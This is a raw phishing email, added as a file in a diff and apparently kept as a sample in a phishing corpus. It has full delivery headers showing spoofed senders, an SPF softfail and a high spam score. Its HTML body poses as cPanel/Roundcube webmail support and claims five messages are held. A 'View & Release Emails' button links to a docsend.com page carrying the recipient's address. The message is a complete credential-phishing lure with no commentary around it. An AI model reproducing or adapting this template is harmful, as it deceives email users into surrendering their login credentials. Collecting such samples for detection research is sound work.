@@ -1,0 +1,210 @@
+Return-Path: info@medifoline.com
+Delivered-To: jose@monkey.org
+X-FDA: 83427569736.26.171B185
+Received: from hostname.culture.az (hostname.culture.az [5.191.247.58])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id E65D61A0007
+	for <jose@monkey.org>; Sat, 10 May 2025 16:43:45 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=pass header.d=culture.az header.s=default header.b=jX6rlIKn;
+	spf=softfail (imf01.b.hostedemail.com: 5.191.247.58 is neither permitted nor
+ denied by domain of info@medifoline.com) smtp.mailfrom=info@medifoline.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1746895426;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=lOsPvOuuy7kXVn/kSsh2s9SfnUtJJSgwPQwmhnQTGog=;
+	b=SEWY6bEAL8uWYTf2H1644Pjtyrl0gM7T0D61OFpjK9MShdOJi2SfqqYSroeAcUjsUg7ZpJ
+	8GtA/xjSM+ZM3YqGE9m8JcM9YDF3Yv0m8EQIP9uJgZNLOC+YuDVfLFxgA+HLqJlmRnb/sf
+	fUtdEWJjLrwTRlsych+37Th078ppTLk=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1746895426; a=rsa-sha256;
+	cv=none;
+	b=6SoBbebW4UULR5SB/E50y9wfjBrrOwrzj9OGQzx1/2HVZPyAPSrGWGzBCYUPsznjbf3VBg
+	BsT2/OUdXYIV+SHTpIIf2IYbXskWORQuCCIeQrggZWxCJuIXDqfuRKc1HWWfWwEsJ26CC9
+	Nuklt9ew0ybLzeAx/WJu+ADoyjMCpeo=
+ARC-Authentication-Results: i=1;
+	imf01.b.hostedemail.com;
+	dkim=pass header.d=culture.az header.s=default header.b=jX6rlIKn;
+	spf=softfail (imf01.b.hostedemail.com: 5.191.247.58 is neither permitted nor
+ denied by domain of info@medifoline.com) smtp.mailfrom=info@medifoline.com;
+	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=culture.az;
+	s=default; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
+	Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=lOsPvOuuy7kXVn/kSsh2s9SfnUtJJSgwPQwmhnQTGog=; b=jX6rlIKnSUv/knncr+bwmStjuP
+	aJE1y6FO3e0E288nXPG03IFkbVUe7D7aPO1nzW1PyfLQ6jzviOzJprHPS1zNJDaxTl6hFhPUVc3/V
+	Aa5v/oMoP8rZ4ddyFxHlNRwi0ALNTOJfBFJ9nlEr9l22XgkxV1PEdcs/KvOheF5+5YAFMl4KZxUXb
+	rmI+ysehEgaimSof2sldi3Qur17+8mvdg9anwJ5pXeMMV+tOSyeFUIOnYpRzEJoffzuN7qEB20/5y
+	tN2U63rsbxMjD7ZrcXfAjE4dt/wYpqxSNGAEClZ8Pc0iy2DzsLniNVqj2lcELIT08XVArEaXn1dnU
+	n3UHJRJg==;
+Received: from [45.141.215.162] (port=58716)
+	by hostname.culture.az with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <info@medifoline.com>)
+	id 1uC8dQ-009fYG-07
+	for jose@monkey.org;
+	Tue, 06 May 2025 07:06:18 +0400
+From: Restoredesk.monkey.org <info@etsioka.gr>
+To: jose@monkey.org
+Subject: 
+ =?UTF-8?B?4pqg77iPIFJlc3RvcmUgVW5kZWxpdmVyZWQgTWVzc2FnZXMgSW50byBZb3VyIEluYm94Lg==?=
+Date: 6 May 2025 05:06:16 +0200
+Message-ID: <20250506050616.FC95CDF192DAE125@etsioka.gr>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - hostname.culture.az
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - medifoline.com
+X-Get-Message-Sender-Via: hostname.culture.az: authenticated_id:
+ berlin@culture.az
+X-Authenticated-Sender: hostname.culture.az: berlin@culture.az
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: E65D61A0007
+X-Stat-Signature: hyo474ukd4nu9k6gf1c7ez3nq86htznm
+X-Rspam-User: 
+X-Spam-Status: Yes, score=12.50
+X-HE-Tag: 1746895425-664784
+X-HE-Meta: 
+ U2FsdGVkX18eImcTE1sGnor08Up0In5UgpukJfamWtbYU2uXeldNDh2c8CTW/oPTY5X0bNmU8qgOydylY8WU9L/VCFmMYvOuwyenCwHBESGrHArPgTwzfINXa68UVnxyLVEHZktc6fJ/04e4UOmQikHQSZi01CpZ9jVKtyfbjSKYEA/i3AFljjIylVSK/+xOViXGs1kMNf0h/h4yLCmxdujXiMD5QQyBNZbOlc70kafHe4i1Er16CcWc/M2TBSmA+9VNWRrd+8h0fNbVQ+la2v4sA9bcdVXVimGRtsmq2q3mlgOV5qHXYBLO25GORX4+c8laE8v/YYkwcmnH1g9+2LeMwI3vLyb9OUYbYrGRACYSVDnC8TsvP2Y+jiMjkaMrXn9kMF4I0y1Azv9E98HEf2SFAwWWwpiwSjUn2Aq9W+VjoGOHOtiAr50ZGeVsk3ThL4WHojv+szdcOVCk1MMUFDMkFXyqDUBS8ReGbyZDoNBf2HAPiCiyTnCDEc5gINGyl5JJwAMrC7DHpb1vKVXm0irmfSlPjx8SwOc4IMTtshVRxq8K5cE5T+ZmExzMJOMSbHuejDIXdemy9Vv54z3KIvGfRueHv7iYXDTuj8svNrOzihqmZh4aixkLO97wlnBkY7ase8J6jCebPO2So5GvnDwtN5GUwiDKxlKRfoZEcg18JTU2y/SS1EKuyFUdzRt6dOY2y2PffFiwlnMfkGoeIs+jsRK/zLlBMwSFRNdWzKvH1oMgVHTZvVJ24mCfULZBJMBzxDhilCuSn2zE6BV+nd/j9CZOngcIKfyJgUrAAJySr14NrEe8zxi7Jmn8o9h8PsyAMRPVqzqP5buLlP4+yrdJWg5GT4kJeG6N96HEKj6L/iq82hcmuOFrOj7xcHaOg5eO2pwEmc8RvRwlM/KREBjwZNB7cAqVpLUMV5ed4crakYUJzkSYxl4gLhMTKpCRMISI8Emt8D/c61yRRMbcWn3IqM3
+ WD7c2BDvWuDbWWYCHGYbkatlI6uPRxwjVJbIenZMAeEv+rAAj8KflkaVsoyV9xe2l1/Ffrdk9W+RYVrMiV3sn2AWELSinGItkoHA1Ic36Tj7EdvEceaatt1cBrozSAMWFbVVgI1XkMP6+zuVYGm1ykSDJmwHzgimDHPY9mDzKJ901fHEiMX3H69lo/6oUrTQBrylbUx0MziUlUo2MdDYX/6PlE90N6rjpsRvhx8zpPom6SgZdCdI/SB/V4SjJgVhheJVQEhyI+NulpA2Re09tUmrT3dBoaknjrjeXzp9z2YGz+tzqkelh3YbIwF6Jx5FOWXcVMJZkI35/IwtuPmKu1yBQqDTP5LI7Czo/Xjam6EmGjnLuc+jyDQFU9k5FfRcK9iuxgA7qdnHDPBHyDqhelgD6x7oxaIFwD04jl/OtihtKZSm9TGDBlJLNfGKLhXC0pcsBlhMhWXzxh0GvWtl/hFQMkPlagkRqrurrxuAgpXlgcmbfkzAVv47W+2pYwZPI+glKR/OrZg5LGilS36TvrpdRvydSa4vCU98FzmV6RxAgB6/gMZYOpDOYPleHC+BWkZnJqxcTIaZxg5FbXTy7dh6jKXXYi4lbLA3E5OoS40qI/q5g4v5F8+vQ9jcCpUhJFRoqvCVlAR245H4DzHXkM2lTbuQo8rWAkPrXhOVk+XE4sgER5Q1yVSBgnA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 214
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helv=
+etica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; w=
+ord-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-co=
+lor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps:=
+ normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
+; text-decoration-style: initial;=20
+text-decoration-color: initial;'>
+<span style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 36p=
+x; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: no=
+rmal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;"><span style=3D"font-weight: bolder; box-sizing: border-box;"><spa=
+n style=3D"color: rgb(253, 121, 2); font-family: System; font-style: italic=
+; box-sizing: border-box;">webmail</span></span></span>
+<span style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14p=
+x; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: no=
+rmal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial; text-decoration-style: initial;=
+ text-decoration-color: initial;"></span>
+<span style=3D"color: rgb(253, 121, 2); text-transform: none; text-indent: =
+0px; letter-spacing: normal; font-family: System; font-size: 14px; font-sty=
+le: italic; font-weight: 700; word-spacing: 0px; white-space: normal; box-s=
+izing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 2=
+55); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-st=
+yle: initial; text-decoration-color: initial;">
+<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
+></span>
+<span style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14p=
+x; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: no=
+rmal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-thickness: initial; text-decoration-style: initial;=
+ text-decoration-color: initial;"></span></p>
+<div lang=3D"x-western" style=3D"color: rgb(44, 54, 58); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
+if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
+x; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; back=
+ground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness=
+: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><div lang=3D"x-western" style=3D"padding-t=
+op: 0px; border-top-color: currentColor; border-top-width: 0px; border-top-=
+style: none; box-sizing: border-box;"><div lang=3D"x-unicode" style=3D"padd=
+ing-top: 0px; border-top-color: currentColor; border-top-width: 0px; border=
+-top-style: none; box-sizing: border-box;">
+<div style=3D'color: rgb(0, 0, 0); padding-top: 0px; font-family: -apple-sy=
+stem, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, =
+"Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; border-top-color:=
+ currentColor; border-top-width: 0px; border-top-style: none; box-sizing: b=
+order-box;'><div style=3D"padding-top: 0px; border-top-color: currentColor;=
+ border-top-width: 0px; border-top-style: none; box-sizing: border-box;" di=
+r=3D"ltr">
+<p style=3D'margin: 0px; color: rgb(34, 34, 34); font-family: "Segoe UI Lig=
+ht", "Segoe UI Bold"; font-size: 16pt; box-sizing: border-box;'><span style=
+=3D"font-weight: bolder; box-sizing: border-box;">You have (5) important em=
+ails awaiting delivery to your inbox<br style=3D"box-sizing: border-box;"><=
+/span></p><span style=3D"color: rgb(34, 34, 34); font-family: serif; font-s=
+ize: 13pt; box-sizing: border-box;">&nbsp;Priority:</span><span>&nbsp;</spa=
+n>
+&nbsp;<span style=3D"color: darkorange; font-size: 15pt; box-sizing: border=
+-box;"><span>&nbsp;</span>&#9679;</span>&nbsp;<span style=3D'color: rgb(34,=
+ 34, 34); font-family: "Segoe UI Light", serif; font-size: 13pt; box-sizing=
+: border-box;'>High<br style=3D"box-sizing: border-box;"><span style=3D"ver=
+tical-align: inherit; box-sizing: border-box;"><span style=3D"font-size: 13=
+pt; box-sizing: border-box;">&nbsp;<span style=3D"vertical-align: inherit; =
+box-sizing: border-box;"><span>&nbsp;</span>
+<span style=3D"color: black; font-family: serif; box-sizing: border-box;">C=
+ustomer ID Email:</span></span></span></span></span><span>&nbsp;</span>&nbs=
+p;<span style=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;<s=
+pan style=3D"font-family: serif; font-size: 13pt; box-sizing: border-box;">=
+&nbsp;<span style=3D"vertical-align: inherit; box-sizing: border-box;">jose=
+@monkey.org<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: b=
+order-box;"></span></span></span>
+<span style=3D"color: rgb(34, 34, 34); font-family: serif; font-size: 13pt;=
+ box-sizing: border-box;">Note:&nbsp;</span><span>&nbsp;</span><span style=
+=3D'color: rgb(34, 34, 34); font-family: "Segoe UI Light", serif; font-size=
+: 13pt; box-sizing: border-box;'>&nbsp;&nbsp;This alert is triggered when i=
+ncoming messages are held and yet to be delivered to your inbox.</span><p s=
+tyle=3D"margin-top: 0px; box-sizing: border-box;"><br style=3D"box-sizing: =
+border-box;"></p>
+<table style=3D'width: 615px; line-height: normal; border-collapse: collaps=
+e; font-feature-settings: "liga" 0;' border=3D"0" cellpadding=3D"0"><tbody =
+style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td=
+ align=3D"center" style=3D"margin: 0px; box-sizing: border-box; background-=
+color: rgb(255, 108, 44);">
+<a style=3D'padding: 6px 20px; border: 1px solid rgb(255, 108, 44); border-=
+image: none; color: white; font-family: "Segoe UI"; font-size: 15pt; displa=
+y: inline-block; box-sizing: border-box; background-color: transparent; tex=
+t-decoration-line: none;' href=3D"https://docsend.com/view/bcydj57tzpx4ztbb=
+/#?cms=3Djose@monkey.org" target=3D"_blank" rel=3D"noreferrer">View &amp; R=
+elease Emails</a><br style=3D"box-sizing: border-box;"></td></tr></tbody></=
+table>
+<p style=3D'margin: 0px; color: rgb(34, 34, 34); font-family: "Segoe UI Lig=
+ht"; font-size: 13pt; box-sizing: border-box;'>&nbsp;</p><hr style=3D"borde=
+r-style: solid none none; height: 0px; overflow: visible; border-right-colo=
+r: currentColor; border-bottom-color: currentColor; border-left-color: curr=
+entColor; border-right-width: 0px; border-bottom-width: 0px; border-left-wi=
+dth: 0px; box-sizing: content-box;"><p style=3D"margin: 0px 0px 1em; box-si=
+zing: border-box;">&nbsp;</p>
+<p style=3D'margin: 0px; color: rgb(102, 102, 102); font-family: "Segoe UI =
+Light"; font-size: 10pt; box-sizing: border-box;'><span style=3D"color: rgb=
+(34, 34, 34); box-sizing: border-box;">Best Regards,<br style=3D"box-sizing=
+: border-box;">Cpanel Roundcube Horde Webmail Customer Service<br style=3D"=
+box-sizing: border-box;">&copy; 2025 cPanel, L.L.C.&nbsp;</span></p></div><=
+/div></div></div></div>
+
+
+</body></html>
+
